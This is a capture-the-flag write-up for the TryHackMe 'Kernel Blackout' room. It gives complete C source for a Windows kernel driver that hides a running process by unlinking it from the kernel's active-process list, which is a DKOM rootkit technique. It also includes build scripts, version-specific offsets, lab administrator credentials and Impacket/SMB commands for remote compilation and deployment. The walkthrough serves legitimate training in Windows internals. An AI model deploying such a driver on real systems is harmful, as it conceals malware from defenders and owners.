# TryHackMe - Kernel Blackout

> *These notes were written with AI assistance for English clarity. Attack paths and commands reflect hands-on completion of the room.*

**Difficulty:** Hard  
**Category:** Windows Internals, Kernel Development, Rootkits  
**Room:** [Kernel Blackout](https://tryhackme.com/room/kernelblackout)  
**Description:** Build a kernel-mode driver that hides `implant.exe` from userland process enumeration using DKOM, then deploy it to the target.

## Introduction

Blue pill: trust user-mode APIs. Red pill: manipulate kernel structures directly.

You get two Windows instances in a dedicated lab:

| Host | Role | Typical IP |
|------|------|------------|
| **MalwareDev** | Dev box — Visual Studio, WDK, compile the `.sys` | `10.200.150.20` |
| **Target** | Victim — runs `implant.exe`, accepts driver upload | `10.200.150.10` |

**Objectives:**
- Connect with the **Blackout** VPN profile (not Premium/KoTH)
- RDP (or remote build) on MalwareDev
- Write a driver that unlinks `implant.exe` from `ActiveProcessLinks`
- Upload `blackout.sys` to the Target web UI
- Confirm the implant disappears from the process list and retrieve the flag

> **Important:** Killing `implant.exe` does **not** award the flag. The process must stay running but **hidden**.

---

## Prerequisites

| Requirement | Notes |
|-------------|-------|
| Blackout `.ovpn` | Downloaded from the room page |
| RDP client | `rdesktop`, `xfreerdp`, or Remmina |
| (Optional) Linux + Impacket | Remote compile via SMB/WMI if you skip GUI |

MalwareDev credentials:

```
User: Administrator
Pass: KernelKernel2323
```

---

## VPN setup

This room uses its **own** OpenVPN config (`*-blackout-*.ovpn`). Other THM VPNs (Premium `10.129.x`, KoTH `10.10.x`) will **not** route `10.200.150.0/24`.

```bash
# Stop other VPNs first
sudo kill $(cat /tmp/thm-premium-vpn.pid 2>/dev/null) $(cat /tmp/koth-vpn.pid 2>/dev/null) 2>/dev/null

sudo openvpn --config ~/path/to/Elyasuuuuu-blackout-*.ovpn \
  --disable-dco --daemon --log /tmp/blackout-vpn.log --writepid /tmp/blackout-vpn.pid

# Verify — expect 10.200.150.0/24 via tun1 (interface name may vary)
ip route | grep 10.200
ping -c 2 10.200.150.10
```

Use `--interface tun1` with `curl` if your machine has multiple VPN tunnels active.

---

## Reconnaissance

### Web interfaces

Both hosts serve a React SPA on **port 80**. The backend API lives on **port 8000**:

| Endpoint | Purpose |
|----------|---------|
| `GET http://<TARGET>:8000/api/processes` | JSON process list + `has_implant` boolean |
| `POST http://<TARGET>:8000/api/upload` | Upload `.sys` driver (`multipart/form-data`, field `file`) |

Before deployment:

```bash
curl --interface tun1 http://10.200.150.10:8000/api/processes
```

You should see `implant.exe` with `"has_implant": true`.

### WinDbg offsets (from room UI)

On MalwareDev, the built-in WinDbg console shows `_EPROCESS` layout for this Windows build (17763 family):

| Field | Offset |
|-------|--------|
| `UniqueProcessId` | `+0x2e0` |
| `ActiveProcessLinks` | `+0x2e8` |
| `ImageFileName` | `+0x450` |

These offsets are **version-specific**. Use the values from the room — do not copy blindly from other builds.

---

## Stage 1 — Driver source (DKOM)

**Technique:** Direct Kernel Object Manipulation (DKOM). Windows maintains a circular doubly-linked list of active processes via `ActiveProcessLinks` inside each `_EPROCESS`. Unlinking an entry hides it from tools that walk this list (Task Manager, `tasklist`, the room's API) while the process keeps executing.

### Logic

1. Walk the `ActiveProcessLinks` list starting from the current process context.
2. Compare `ImageFileName` at offset `0x450` to `implant.exe`.
3. On match, rewire neighbors:
   - `prev->Flink = next`
   - `next->Blink = prev`
4. Point the target's own `Flink`/`Blink` to itself (avoids BSOD if the kernel revisits the node).

Reference source (`hide.c`):

```c
#include <ntddk.h>

#define OFFSET_ACTIVE_LINKS 0x2e8
#define OFFSET_IMAGE_NAME   0x450

void HideProcess(char* processName) {
    PEPROCESS startProcess = PsGetCurrentProcess();
    PEPROCESS currentProcess = startProcess;

    do {
        PSTR name = (PSTR)((PUCHAR)currentProcess + OFFSET_IMAGE_NAME);

        if (strstr(name, processName)) {
            PLIST_ENTRY listEntry = (PLIST_ENTRY)((PUCHAR)currentProcess + OFFSET_ACTIVE_LINKS);

            if (listEntry->Flink != NULL && listEntry->Blink != NULL) {
                listEntry->Blink->Flink = listEntry->Flink;
                listEntry->Flink->Blink = listEntry->Blink;
                listEntry->Flink = listEntry;
                listEntry->Blink = listEntry;
            }
            return;
        }

        PLIST_ENTRY nextLink = (PLIST_ENTRY)((PUCHAR)currentProcess + OFFSET_ACTIVE_LINKS);
        currentProcess = (PEPROCESS)((PUCHAR)nextLink->Flink - OFFSET_ACTIVE_LINKS);

    } while (currentProcess != startProcess);
}

NTSTATUS DriverEntry(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath) {
    UNREFERENCED_PARAMETER(DriverObject);
    UNREFERENCED_PARAMETER(RegistryPath);
    HideProcess("implant.exe");
    return STATUS_SUCCESS;
}
```

Alternative approach: start from `PsInitialSystemProcess` and loop with a safety counter (also works in writeups).

---

## Stage 2 — Compile on MalwareDev

### Option A — RDP (recommended)

```bash
rdesktop -u Administrator -p 'KernelKernel2323' 10.200.150.20
```

1. Copy `hide.c` to the Desktop (or write it in VS Code, pre-installed).
2. Open **x64 Native Tools Command Prompt for VS 2022** (Start Menu shortcut).
3. Run the build script.

### Build script (`kbuild.bat`)

> **Gotcha:** MalwareDev ships **Visual Studio Build Tools 2022**, not the Community edition. The `vcvars64.bat` path is:

```
C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat
```

```bat
@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat"
cl.exe /D_AMD64_ /I"C:\Program Files (x86)\Windows Kits\10\Include\10.0.19041.0\km" /c hide.c
link.exe /DRIVER /RELEASE /SUBSYSTEM:NATIVE /ENTRY:DriverEntry hide.obj ntoskrnl.lib /LIBPATH:"C:\Program Files (x86)\Windows Kits\10\Lib\10.0.19041.0\km\x64" /OUT:blackout.sys
```

```cmd
cd C:\Users\Administrator\Desktop
kbuild.bat
```

Output: `blackout.sys` (~3–4 KB).

### Option B — Remote build from Linux (Impacket)

```bash
# Upload sources via SMB
smbclient //10.200.150.20/C$ -U 'Administrator%KernelKernel2323' \
  -c 'put hide.c Users/Administrator/Desktop/hide.c; put kbuild.bat Users/Administrator/Desktop/kbuild.bat'

# Compile remotely
impacket-wmiexec 'Administrator:KernelKernel2323@10.200.150.20' \
  'cmd /c "cd C:\Users\Administrator\Desktop && kbuild.bat"'

# Download the driver
smbclient //10.200.150.20/C$ -U 'Administrator%KernelKernel2323' \
  -c 'get Users/Administrator/Desktop/blackout.sys ./blackout.sys'
```

---

## Stage 3 — Deploy to Target

### Via browser (MalwareDev or your machine)

1. Open `http://10.200.150.10` (SPA on port 80).
2. Use the **DRIVER_PAYLOAD** upload panel (accepts `.sys` only).
3. Select `blackout.sys` and upload.

### Via curl (from Linux)

```bash
curl --interface tun1 -X POST -F "file=@blackout.sys" \
  http://10.200.150.10:8000/api/upload
```

Expected JSON response includes driver name, size, and SHA-256 hash.

---

## Stage 4 — Verification

Refresh the Target page or query the API:

```bash
curl --interface tun1 http://10.200.150.10:8000/api/processes
```

Success indicators:

| Field | Before | After |
|-------|--------|-------|
| `has_implant` | `true` | `false` |
| `implant.exe` in list | visible | **absent** |
| `message` | empty | contains the flag |

The implant is still running in kernel space — only userland enumeration is blinded.

---

## Attack chain summary

```
Blackout VPN
  └─> MalwareDev (RDP / SMB)
        └─> WinDbg → offsets 0x2e8 / 0x450
              └─> hide.c (DKOM unlink implant.exe)
                    └─> kbuild.bat → blackout.sys
                          └─> POST :8000/api/upload → Target
                                └─> has_implant: false → flag
```

---

## Troubleshooting

| Problem | Fix |
|---------|-----|
| Cannot ping `10.200.150.x` | Wrong VPN — use Blackout `.ovpn`, not Premium/KoTH |
| `cl.exe` not found | Use BuildTools `vcvars64.bat` path, not Community |
| Upload 404 on port 80 | API is on **port 8000** |
| BSOD after load | Wrong offsets or broken list pointers — self-link after unlink |
| Flag not shown | Do not kill `implant.exe`; driver must hide it while it runs |

---

## Key takeaways

1. **DKOM** is the classic process-hiding primitive — unlink `ActiveProcessLinks`, process keeps running.
2. **Offsets are build-specific** — always derive from WinDbg/`dt nt!_EPROCESS` on the target OS.
3. **Kernel mistakes = BSOD** — redirect unlinked node's pointers to itself.
4. **Userland APIs lie** after DKOM — Task Manager, WMI, and custom APIs that walk `ActiveProcessLinks` miss the process.
5. **Lab VPN isolation** — dedicated Blackout profile; do not mix with other THM networks.

---

## References

- [0xb0b — Kernel Blackout Writeup](https://0xb0b.gitbook.io/writeups/tryhackme/2026/kernel-blackout)
- [OWASP / Microsoft — Kernel driver development](https://learn.microsoft.com/en-us/windows-hardware/drivers/)
- [DKOM overview (Vault7 PoC outline)](https://wikileaks.org/vault7/document/2014-11-DKOM-PoC-Outline/)
